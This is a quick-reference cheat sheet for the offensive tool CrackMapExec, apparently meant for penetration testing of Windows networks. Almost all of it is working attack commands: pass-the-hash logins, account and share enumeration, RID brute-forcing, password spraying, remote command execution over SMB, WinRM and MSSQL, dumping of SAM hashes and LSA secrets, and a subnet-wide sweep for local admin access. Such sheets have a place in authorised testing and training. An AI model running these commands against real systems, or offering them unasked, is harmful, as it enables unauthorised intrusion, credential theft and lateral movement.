# CrackMapExec Quick Reference

## Authentication Testing

```bash
crackmapexec smb TARGET -u user -p pass
crackmapexec smb TARGET -u user -H NTLM_HASH        # pass the hash
crackmapexec winrm TARGET -u user -p pass
crackmapexec ssh TARGET -u user -p pass
crackmapexec mssql TARGET -u sa -p pass
```

## Enumeration

```bash
crackmapexec smb TARGET -u user -p pass --shares
crackmapexec smb TARGET -u user -p pass --users
crackmapexec smb TARGET -u user -p pass --groups
crackmapexec smb TARGET -u '' -p '' --rid-brute
crackmapexec smb TARGET -u user -p pass --pass-pol
crackmapexec smb RANGE -u user -p pass --loggedon-users
```

## Password Spraying

```bash
crackmapexec smb DC -u users.txt -p 'Password1!' --continue-on-success
```

## Command Execution

```bash
crackmapexec smb TARGET -u admin -p pass -x "whoami"
crackmapexec winrm TARGET -u admin -p pass -x "whoami"
crackmapexec mssql TARGET -u sa -p pass -x "whoami"
```

## Credential Dumping

```bash
crackmapexec smb TARGET -u admin -p pass --sam        # local hashes
crackmapexec smb TARGET -u admin -p pass --lsa        # LSA secrets
```

## Network-Wide (the power move)

```bash
crackmapexec smb 10.10.10.0/24 -u admin -p pass --continue-on-success
# Machines showing (Pwn3d!) = you have local admin
```
